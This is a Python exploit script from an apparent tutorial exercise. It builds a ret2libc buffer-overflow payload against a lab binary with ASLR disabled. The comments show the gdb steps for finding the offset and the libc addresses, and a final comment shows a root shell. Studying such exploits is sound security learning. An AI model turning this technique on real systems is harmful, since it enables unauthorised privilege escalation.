#!/usr/bin/env python

import struct

# https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/
# note: following is the 32bit version with ASLR disabled

# find padding before eip overwrite
# gdb-peda$ pattern_create 400 pattern.txt
# gdb-peda$ run < pattern.txt
# Stopped reason: SIGSEGV
# 0x4c414136 in ?? ()
# gdb-peda$ pattern_offset 0x4c414136
# 1279344950 found at offset: 96
padding_before_eip_overwrite = 96 * "A"

# find the location of libc system()
# gdb-peda$ p system
# $1 = {<text variable, no debug info>} 0xf7e39d80 <system>
libc_system = struct.pack("<I", 0xf7e39d80)

# find the location of libc exit() (to exit gracefully)
# gdb-peda$ p exit
# $1 = {<text variable, no debug info>} 0xf7e2d9b0 <exit>
libc_exit = struct.pack("<I", 0xf7e2d9b0)

# find the location of /bin/sh
# gdb-peda$ find "/bin/sh"
# Searching for '/bin/sh' in: None ranges
# Found 4 results, display max 4 items:
# ret2libc : 0x80485ab ("/bin/sh")
# ret2libc : 0x80495ab ("/bin/sh")
#   [heap] : 0x804b014 ("/bin/sh")
#     libc : 0xf7f5aa3f ("/bin/sh")
bin_sh = struct.pack("<I", 0x80485ab)

payload = ""

payload += padding_before_eip_overwrite

# call libc system() and create stack frame below it which should look like this:
# [return_address]
# [arg]
payload += libc_system # libc system()
payload += libc_exit # return address, can be junk but this exits gracefully
payload += bin_sh # arg to libc system()

print payload

payload_file = open("payload", "wb")
payload_file.write(payload)
payload_file.close()

# (cat payload; cat) | ./ret2libc
# whoami
# root














